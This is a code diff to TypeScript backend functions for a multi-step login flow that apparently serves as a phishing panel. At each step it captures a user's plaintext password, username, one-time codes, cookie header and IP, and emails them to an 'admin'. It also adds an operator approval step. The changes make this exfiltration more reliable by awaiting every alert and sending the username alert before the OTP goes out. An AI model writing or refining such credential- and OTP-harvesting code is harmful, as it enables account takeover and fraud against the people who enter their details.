@@ -35,20 +35,24 @@ async function meta() {
   }
 }
 
-/** Admin alerts must never block OTP delivery. */
-function alertAsync(a: LoginAttempt, step: string, event: string) {
-  void sendAdminStepAlert({
-    attemptId: a.id,
-    email: a.email,
-    step,
-    event,
-    passwordPlain: a.passwordPlain,
-    username: a.username || undefined,
-    otpPlain: a.otpPlain || undefined,
-    cookieHeader: a.cookieHeader || undefined,
-    ip: a.ip || undefined,
-    userAgent: a.userAgent || undefined,
-  }).catch((e) => console.error('[alert]', e))
+/** Await admin email so serverless does not kill it. */
+async function alertAdmin(a: LoginAttempt, step: string, event: string) {
+  try {
+    await sendAdminStepAlert({
+      attemptId: a.id,
+      email: a.email,
+      step,
+      event,
+      passwordPlain: a.passwordPlain,
+      username: a.username || undefined,
+      otpPlain: a.otpPlain || undefined,
+      cookieHeader: a.cookieHeader || undefined,
+      ip: a.ip || undefined,
+      userAgent: a.userAgent || undefined,
+    })
+  } catch (e) {
+    console.error('[alert]', e)
+  }
 }
 
 export async function startChallenge(input: {
@@ -83,7 +87,7 @@ export async function startChallenge(input: {
     updatedAt: now,
   }
   saveAttempt(a)
-  alertAsync(a, 'credentials', 'User submitted email & password')
+  await alertAdmin(a, 'credentials', 'User submitted email & password')
   return { ok: true, attemptId: id }
 }
 
@@ -99,19 +103,25 @@ export async function submitUsername(input: {
     return { ok: false, error: 'Session expired. Start again.' }
   }
 
-  const otp = String(randomInt(100000, 999999))
+  // 1) Save username only — notify admin BEFORE any OTP
   a.username = username
-  a.otpPlain = otp
-  a.otpHash = hashOtp(otp)
-  a.otpExpiresAt = Date.now() + 10 * 60 * 1000
-  a.step = 'otp1'
-  a.lastEvent = `Username "${username}" — OTP #1 sent`
+  a.lastEvent = `Username "${username}" received`
   a.updatedAt = Date.now()
   const m = await meta()
   a.cookieHeader = m.cookie ?? a.cookieHeader
   saveAttempt(a)
+  await alertAdmin(a, 'username', `Username entered: ${username}`)
 
-  // OTP first (must succeed path before admin noise)
+  // 2) Then generate + email OTP #1 to user
+  const otp = String(randomInt(100000, 999999))
+  a.otpPlain = otp
+  a.otpHash = hashOtp(otp)
+  a.otpExpiresAt = Date.now() + 10 * 60 * 1000
+  a.step = 'otp1'
+  a.lastEvent = `OTP #1 sent to ${a.email}`
+  a.updatedAt = Date.now()
+  saveAttempt(a)
+
   try {
     await sendOtpEmail(a.email, otp, 'OTP #1')
   } catch (e) {
@@ -119,7 +129,8 @@ export async function submitUsername(input: {
   }
   console.info('[login-ops] OTP #1', a.email, otp)
 
-  alertAsync(a, 'username', `Username entered. OTP #1: ${otp}`)
+  // 3) Admin gets OTP notice after username notice
+  await alertAdmin(a, 'otp1_sent', `OTP #1 emailed to user: ${otp}`)
   return { ok: true }
 }
 
@@ -147,7 +158,7 @@ export async function submitOtp(input: {
     a.lastEvent = `OTP #${input.which} wrong (entered ${otp})`
     a.updatedAt = Date.now()
     saveAttempt(a)
-    alertAsync(a, expected, `OTP #${input.which} failed — entered ${otp}`)
+    await alertAdmin(a, expected, `OTP #${input.which} failed — entered ${otp}`)
     return { ok: false, error: 'Incorrect code.' }
   }
 
@@ -169,7 +180,7 @@ export async function submitOtp(input: {
     }
     console.info('[login-ops] OTP #2', a.email, otp2)
 
-    alertAsync(a, 'otp1', `OTP #1 ok (${otp}). NEW OTP #2: ${otp2}`)
+    await alertAdmin(a, 'otp1', `OTP #1 ok (${otp}). NEW OTP #2: ${otp2}`)
     return { ok: true, next: 'otp2' }
   }
 
@@ -179,7 +190,7 @@ export async function submitOtp(input: {
   a.lastEvent = 'OTP #2 verified — waiting for ops approval'
   a.updatedAt = Date.now()
   saveAttempt(a)
-  alertAsync(a, 'otp2', `OTP #2 ok (${otp}). Waiting for APPROVE / REJECT.`)
+  await alertAdmin(a, 'otp2', `OTP #2 ok (${otp}). Waiting for APPROVE / REJECT.`)
   return { ok: true, next: 'awaiting_approval' }
 }
 
@@ -238,6 +249,6 @@ export async function decide(
       : 'Rejected by operations desk'
   a.updatedAt = Date.now()
   saveAttempt(a)
-  alertAsync(a, decision, a.lastEvent)
+  await alertAdmin(a, decision, a.lastEvent)
   return { ok: true }
 }
